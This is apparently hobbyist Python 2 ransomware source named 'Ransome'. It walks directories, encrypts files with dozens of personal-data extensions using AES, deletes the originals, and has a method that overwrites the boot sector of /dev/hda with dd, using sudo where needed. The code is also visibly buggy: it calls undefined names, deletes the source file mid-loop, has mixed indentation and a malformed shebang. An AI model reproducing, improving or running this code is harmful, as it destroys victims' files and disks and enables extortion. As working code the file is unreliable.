#bin/bash/python2.7
import os, random, getpass
from Crypto.Cipher import AES
from Crypto.Hash import SHA256

class Ransome:

    def __init__(self, key):
        self.key = self.get_key(key)

    def encrypt(self, file_name):
        chunk_size = 64 * 1024
        output_file = file_name + "crypt"
        file_size = str(os.path.getsize(file_name)).zfill(16)
        IV = ''
        PADDING = '{'
        pad = lambda s: s + (chunk_size - len(s) % chunk_size) * PADDING

        for i in range(16):
            IV += chr(random.randint(0, 0xFF))

        encryptor = AES.new(self.key, AES.MODE_CBC, IV)

        with open(file_name, 'r+b') as infile:
            with open(output_file, 'wb') as outfile:
                outfile.write(file_size)
                outfile.write(IV)

                while True:
                    chunk = infile.read(chunk_size)
                    if len(chunk) == 0:
                        break
                    elif len(chunk) % 16 != 0:
                        chunk += '' * (16 -(len(chunk) % 16))

                    outfile.write(encryptor.encrypt(pad(chunk)))
                    os.remove(file_name)

    def decrypt(self, file_name):
        chunk_size = 64 * 1024
        output_file = file_name[:5]

        with open(file_name, 'rb') as infile:
            file_size = long(infile.read(16))
            IV = infile.read(16)

            decrytor = AES.new(self.key, AES.MODE_CBC, IV)

            with open(output_file, 'wb') as outfile:
                while True:
                    chunk = infile.read(chunk_size)
                    if len(chunk) == 0:
                        break

                    outfile.write(decrypt.decrypt(chunk))

                outfile.truncate(file_size)

    def discover_files(self, start_path):
        extensions = [
            # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
            'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images
            'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound
            'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Video and movies
            'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx', # microsoft office
            'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', # OpenOffice, Adobe, Latex, Markdown, etc
            'yml', 'yaml', 'json', 'xml', 'csv', # structured data
            'db', 'sql', 'dbf', 'mdb', 'iso', # databases and disc images

            'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # web technologies
            'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C source code
            'java', 'class', 'jar', # java source code
            'ps', 'bat', 'vb', # windows based scripts
            'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # linux/mac based scripts
            'go', 'py', 'pyc', 'bf', 'coffee', # other source code files

            'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak', 'txt',  # compressed formats
        ]

        for dirpath, dirs, files in os.walk(start_path):
            for i in files:
                absolute_path = os.path.abspath(os.path.join(dirpath, i))
                ext = absolute_path.split('.')[-1]
                if ext in extensions:
                    yield absolute_path

    def boot_lock(self):
        if sys.platform == 'linux2' and getpass.getuser() == 'root':
            try:
                    os.system("dd if=boot.bin of=/dev/hda bs=512 count=1 && exit")
            except:
                pass

        elif sys.platform == 'linux2':
		        try:
                    os.system("sudo dd if=boot.bin of=/dev/hda bs=512 count=1 && exit")
                except:
                    pass

    def attack_sys(self):
        startdirs = ['/root/Desktop/ransome_test/']
        print "Encryption Started..."
        for currentDir in startdirs:
            for file in self.discover_files(currentDir):
                self.encrypt(file)

    @staticmethod
    def get_key(password):
        hasher = SHA256.new(password)
        return hasher.digest()

def main():
    r = Ransome('hello world')
    r.attack_sys()

if __name__ == '__main__':
    main()